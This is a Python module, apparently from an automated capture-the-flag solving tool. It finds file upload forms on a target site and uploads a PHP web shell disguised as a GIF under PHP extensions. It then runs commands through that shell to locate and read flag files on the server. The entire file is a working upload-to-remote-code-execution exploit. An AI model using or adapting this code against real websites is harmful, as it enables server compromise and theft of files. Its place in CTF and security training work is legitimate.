from unit import BaseUnit
from collections import Counter
import sys
from io import StringIO
import argparse
from pwn import *
import subprocess
import os
import units.raw
import re
import units.web
import requests
import magic
import units

delim = '@@DELIMETER@@'
special = '@@SPECIAL@@'

potential_flag_names = ['flag', 'flag.txt']


class Unit(units.web.WebUnit):

	def __init__(self, katana, parent, target):

		# Run the parent constructor, to ensure this is a valid URL
		super(Unit, self).__init__(katana, parent, target)
		
		# Check if we can reach this...
		try:
			self.response = requests.get(self.target)
		except requests.exceptions.ConnectionError:
			raise units.NotApplicable

		# Check if there is even file upload functionality present
		self.upload = re.findall(r"enctype=['\"]multipart/form-data['\"]", self.response.text, flags=re.IGNORECASE)

		if not self.upload:
			# If not, don't bother with this unit
			raise units.NotApplicable


	def enumerate(self, katana):
		
		# This should "yield 'name', (params,to,pass,to,evaluate)"
		# evaluate will see this second argument as only one variable and you will need to parse them out
		
		action = re.findall(r"<\s*form.*action\s*=\s*['\"](.+?)['\"]", self.response.text, flags=re.IGNORECASE)
		method = re.findall(r"<\s*form.*method\s*=\s*['\"](.+?)['\"]", self.response.text, flags=re.IGNORECASE)
		upload = self.upload

		potential_file_variables = [
			'fileToUpload', 'file', 'upload_file', 'file_to_upload',
		]

		file_regex = "<\s*input.*name\s*=\s*['\"](%s)['\"]" % "|".join(potential_file_variables)
		file = re.findall(file_regex, self.response.text, flags=re.IGNORECASE)

		if not file:
			# JOHN: We can't find a filename variable. Maybe it's not in our list yet!
			return # This will tell THE WHOLE UNIT to stop... it will no longer generate cases.

		if action and method and upload and file:
			if action: action = action[0]
			if action.startswith(self.target): action = action[len(self.target):]
			if method: method = method[0]
			if file: file = file[0]

			try:
				method = vars(requests)[method.lower()]
			except IndexError:
				log.warning("Could not find an appropriate HTTP method... defaulting to POST!")
				method = requests.post

			extensions = ['php', 'gif', 'php3', 'php5', 'php7']

			for ext in extensions:
				r = method(self.target.rstrip('/')+'/' + action, files = {file: ('anything.%s' % ext, 
					StringIO(f'GIF89a;{delim}<?php system($_GET["c"]) ?>{delim}'), 'image/gif' ) })

				potential_location_regex = 'href=["\'](.+?.%s)["\']' % ext

				location = re.findall(potential_location_regex, r.text, flags=re.IGNORECASE )
				if location:
					for file_path in location:
						if file_path.startswith(self.target): file_path = file_path[len(self.target):]
						yield (method, action, file, ext, location, file_path)

		else:
			return  # This will tell THE WHOLE UNIT to stop... it will no longer generate cases.


	def evaluate(self, katana, case):
		# Split up the self.target (see get_cases)
		method, action, file, ext, location, file_path = case

		r = requests.get(self.target.rstrip('/')+'/' + file_path,
					params = { 'c' : f'/bin/echo -n {special}' })

		if f'{delim}{special}{delim}' in r.text:
			for flagname in potential_flag_names:
				r = requests.get(self.target.rstrip('/')+'/' + file_path,
				params = { 'c' : f'find / -name {flagname}' })

				flag_locations = re.findall(f'{delim}(.+?){delim}', r.text, flags = re.MULTILINE | re.DOTALL )

				if flag_locations:
					flag_locations = flag_locations[0]

					for fl in flag_locations.split('\n'):
						fl = fl.strip()
					
						r = requests.get(self.target.rstrip('/')+'/' + file_path,
							params = { 'c' : f'cat {fl}' })

						flag = re.findall(f'{delim}(.+?){delim}', r.text, flags = re.MULTILINE | re.DOTALL )
						if flag:
							flag = flag[0]
							katana.add_results(self, flag)
							if katana.locate_flags(self, flag):
								self.completed = True

		# You should ONLY return what is "interesting" 
		# Since we cannot gauge the results of this payload versus the others,
		# we will only care if we found the flag.
		return None
